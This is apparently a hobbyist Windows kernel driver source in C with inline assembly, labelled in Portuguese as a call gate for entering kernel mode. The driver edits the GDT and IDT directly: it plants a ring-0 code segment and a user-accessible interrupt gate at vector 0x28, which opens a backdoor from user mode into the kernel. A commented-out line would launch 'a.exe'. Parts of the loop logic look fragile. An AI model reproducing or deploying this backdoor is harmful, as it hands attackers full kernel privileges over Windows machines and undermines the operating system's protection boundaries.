/*CALL GATE PARA AVANÇAR AO MODO KERNEL - DESENVOLVIDO PELO PROGRAMADOR BRUNINHO*/
#include <wdm.h>
#include <process.h>

unsigned long BaseOfGdt1 = 0;
unsigned long BaseOfGdt2 = 0;
unsigned long BaseOfIdt1 = 0;
unsigned long BaseOfIdt2 = 0;
unsigned short LimitOfGdt = 0;
unsigned short LimitOfGdt1 = 0;
unsigned char Counter = 0;
typedef struct _Idtr2
{
    unsigned short LimitsOfIdt1;
    unsigned long BaseOfIdt;
}idtr2;
idtr2 idt2;
typedef struct _Gdtr2
{
    unsigned short LimitsOfGdt1;
    unsigned long BaseOfGdt;
}gdtr2;
gdtr2 gdt2;
NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	//_execv("a.exe","");

_asm
{
Start:
sgdt[gdt2]
lea esi,[gdt2]
mov esi,[esi]
mov LimitOfGdt,si
lea eax,[gdt2+2]
mov eax,[eax]
mov BaseOfGdt1,eax
sgdt[gdt2]
lea esi,[gdt2]
mov esi,[esi]
mov LimitOfGdt1,si
lea ecx,[gdt2+2]
mov ecx,[ecx]
mov BaseOfGdt2,ecx
cmp eax,ecx
jz Start
Start1:
sidt[idt2]
lea ebx,[idt2+2]
mov ebx,[ebx]
mov BaseOfIdt1,ebx
sidt[idt2]
lea edx,[idt2+2]
mov edx,[edx]
mov BaseOfIdt2,edx
cmp ebx,edx
jz Start1
                mov ebx,BaseOfGdt1
				lea ebx,[ebx]
                add ebx,8
				mov al,Counter
                add al,8
                mov Counter,al
L0:     cmp LimitOfGdt,0
                jbe L3
                mov ax,LimitOfGdt
                sub ax,8
                mov LimitOfGdt,ax
                                L1:
                //mov eax,BaseOfGdt1
				lea edx,[ebx+5]
                mov al,byte ptr ds:[edx]
                        test al,0x80
                        jz L2
                        add ebx,8
                        mov al,Counter
                        add al,8
                        mov Counter,al
                        jmp L0
L2:
						mov BaseOfGdt1,ebx
mov edx,BaseOfIdt1
mov eax,0x00001004
mov cl,Counter
movzx ecx,cl
shl ecx,0x10
or eax,ecx
add edx,0x140
mov dword ptr ds:[edx],eax
mov dword ptr ds:[edx+4],0x0040ee00                                     
mov edx,BaseOfIdt2
mov eax,0x00001004
mov cl,Counter
movzx ecx,cl
shl ecx,0x10
or eax,ecx
add edx,0x140
mov dword ptr ds:[edx],eax
mov dword ptr ds:[edx+4],0x0040ee00
mov eax,BaseOfGdt1
mov dword ptr ds:[eax],0x0000ffff
mov dword ptr ds:[eax+4],0x00cf9b00
mov eax,BaseOfGdt2
add al,Counter
mov BaseOfGdt2,eax
mov dword ptr ds:[eax],0x0000ffff
mov dword ptr ds:[eax+4],0x00cf9b00
L3:
}
    return 0;
}
